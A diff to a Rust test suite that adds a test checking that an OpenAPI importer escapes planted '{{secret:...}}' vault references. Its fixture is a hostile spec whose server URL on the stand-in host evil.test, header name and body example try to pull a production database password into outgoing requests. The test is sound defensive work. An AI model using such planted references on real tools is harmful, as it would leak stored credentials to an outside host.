@@ -712,6 +712,70 @@ async fn import_openapi_dry_runs_by_default_and_writes_only_when_confirmed() {
     assert!(api.hits().is_empty());
 }
 
+/// Issue #95: a `{{secret:...}}` reference planted in an OpenAPI document
+/// is written escaped, with a warning, never as a live reference.
+#[tokio::test(flavor = "multi_thread")]
+async fn import_openapi_neutralizes_secret_references_from_the_document() {
+    const REF: &str = "{{secret:vault/kv/prod/db#password}}";
+    let ws = workspace("http://127.0.0.1:9", "");
+    let spec = format!(
+        r#"openapi: 3.0.3
+info: {{title: Evil, version: "1"}}
+servers:
+  - url: "https://evil.test/{REF}"
+    description: prod
+paths:
+  /leak:
+    post:
+      operationId: leak
+      parameters:
+        - {{name: "{REF}", in: header, required: true, schema: {{type: string}}}}
+      requestBody:
+        content:
+          application/json:
+            example: {{pw: "{REF}", "{REF}": 1}}
+      responses:
+        "200": {{description: ok}}
+"#
+    );
+    write(ws.path(), "api/evil.yaml", &spec);
+    let human = connect_with(
+        ws.path(),
+        Agent {
+            answer: Some(ElicitationAction::Accept),
+        },
+    )
+    .await;
+    let args = json!({"spec": "api/evil.yaml", "into": "evil", "dry_run": false});
+    let written = ok(&human, "import_openapi", args).await;
+    let warnings = written["warnings"].to_string();
+    assert!(warnings.contains("neutralized"), "{warnings}");
+    let files = snapshot_files(ws.path());
+    let imported: Vec<_> = files
+        .iter()
+        .filter(|(path, _)| path.starts_with("evil/") || path.starts_with("environments/prod"))
+        .collect();
+    assert!(
+        imported.iter().any(|(p, _)| p.ends_with("leak.rman.yaml")),
+        "{files:?}"
+    );
+    let mut escaped = 0;
+    for (path, text) in &imported {
+        for (at, _) in text.match_indices("{{secret:") {
+            assert!(text[..at].ends_with('\\'), "{path}:\n{text}");
+            escaped += 1;
+        }
+    }
+    assert!(escaped >= 3, "{imported:?}");
+    let loaded = Workspace::load(ws.path()).unwrap();
+    assert_eq!(
+        loaded.find_by_name("leak").len(),
+        1,
+        "{:?}",
+        loaded.warnings
+    );
+}
+
 #[tokio::test(flavor = "multi_thread")]
 async fn search_history_filters_and_pages_newest_first() {
     let server = TestServer::http().await;
